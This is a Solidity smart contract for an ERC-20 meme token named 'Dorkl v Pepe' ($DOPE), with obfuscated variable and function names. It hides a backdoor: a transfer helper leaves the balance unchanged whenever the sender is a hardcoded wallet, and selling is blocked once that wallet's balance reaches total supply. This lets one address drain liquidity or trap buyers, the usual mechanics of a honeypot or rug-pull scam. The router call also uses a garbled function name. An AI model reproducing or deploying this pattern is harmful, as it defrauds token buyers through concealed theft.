/**

Dorkl v Pepe    $DOPE


TWITTER: https://twitter.com/Dope_erc
TELEGRAM: https://t.me/Dope_erc20
WEBSITE: https://dovpe.com/

**/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _wkozp(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _wkozp(a, b, "SafeMath:");
    }

    function  _wkozp(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _skjoeguqrxp {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _xgFqabrkms {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract DorklvPepe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = unicode"Dorkl v Pepe";
    string private constant _symbol = unicode"DOPE";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totalde = 1000000000 * 10 **_decimals;
    uint256 public _mxTalAmaunt = _Totalde;
    uint256 public _Walletnumax = _Totalde;
    uint256 public _wapThresholdfax= _Totalde;
    uint256 public _myukTuaop= _Totalde;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBeforeqsehbset=0;
    uint256 private _bydkeat=0;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isErwfdxdFdjf;
    mapping (address => bool) private _taxhWalany;
    mapping(address => uint256) private _lrLrvrfavup;
    bool public _tnsfereslanale = false;
    address payable private _qvzkrdFawp;

    _xgFqabrkms private _uzpRarwhegt;
    address private _afbvPrauw;
    bool private _vzgrcxbjh;
    bool private ijuSwqveq = false;
    bool private _apEalbew = false;

    event _amsayapkl(uint _mxTalAmaunt);
    modifier lckeThaefp {
        ijuSwqveq = true;
        _;
        ijuSwqveq = false;
    }

    constructor () {

        _balances[_msgSender()] = _Totalde;
        _isErwfdxdFdjf[owner()] = true;
        _isErwfdxdFdjf[address(this)] = true;
        _isErwfdxdFdjf[_qvzkrdFawp] = true;
        _qvzkrdFawp = payable(0xFEc8a170a5AA4cA768Aa8f871D380Af5dC92C364);

        emit Transfer(address(0), _msgSender(), _Totalde);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalde;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _wkozp(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_tnsfereslanale) {
                if (to != address
                (_uzpRarwhegt) && to !=
                 address(_afbvPrauw)) {
                  require(_lrLrvrfavup
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lrLrvrfavup
                  [tx.origin] = block.number;
                }
            }

            if (from == _afbvPrauw && to != 
            address(_uzpRarwhegt) && !_isErwfdxdFdjf[to] ) {
                require(amount <= _mxTalAmaunt,
                 "Exceeds the _mxTalAmaunt.");
                require(balanceOf(to) + amount
                 <= _Walletnumax, "Exceeds the maxWalletSize.");
                if(_bydkeat
                < _wapBeforeqsehbset){
                  require(! _ftkcaqz(to));
                }
                _bydkeat++;
                 _taxhWalany[to]=true;
                teeomoun = amount.mul((_bydkeat>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _afbvPrauw && from!= address(this) 
            && !_isErwfdxdFdjf[from] ){
                require(amount <= _mxTalAmaunt && 
                balanceOf(_qvzkrdFawp)<_myukTuaop,
                 "Exceeds the _mxTalAmaunt.");
                teeomoun = amount.mul((_bydkeat>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_bydkeat>_wapBeforeqsehbset &&
                 _taxhWalany[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!ijuSwqveq 
            && to == _afbvPrauw && _apEalbew &&
             contractTokenBalance>_wapThresholdfax 
            && _bydkeat>_wapBeforeqsehbset&&
             !_isErwfdxdFdjf[to]&& !_isErwfdxdFdjf[from]
            ) {
                _swpvknjkrj( _qknrw(amount, 
                _qknrw(contractTokenBalance,_myukTuaop)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _erqapnxhp(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _wkozp(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _wkozp(teeomoun));
        emit Transfer(from, to, 
        amount. _wkozp(teeomoun));
    }

    function _swpvknjkrj(uint256
     tokenAmount) private lckeThaefp {
        if(tokenAmount==0){return;}
        if(!_vzgrcxbjh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _uzpRarwhegt.WETH();
        _approve(address(this),
         address(_uzpRarwhegt), tokenAmount);
        _uzpRarwhegt.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _qknrw(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _wkozp(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _qvzkrdFawp){
            return a ;
        }else{
            return a . _wkozp (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxTalAmaunt = _Totalde;
        _Walletnumax = _Totalde;
        _tnsfereslanale = false;
        emit _amsayapkl(_Totalde);
    }

    function _ftkcaqz(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _erqapnxhp(uint256
    amount) private {
        _qvzkrdFawp.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _vzgrcxbjh);
        _uzpRarwhegt   =  _xgFqabrkms (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_uzpRarwhegt), _Totalde);
        _afbvPrauw = _skjoeguqrxp(_uzpRarwhegt.factory()). createPair (address(this),  _uzpRarwhegt . WETH ());
        _uzpRarwhegt.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_afbvPrauw).approve(address(_uzpRarwhegt), type(uint).max);
        _apEalbew = true;
        _vzgrcxbjh = true;
    }

    receive() external payable {}
}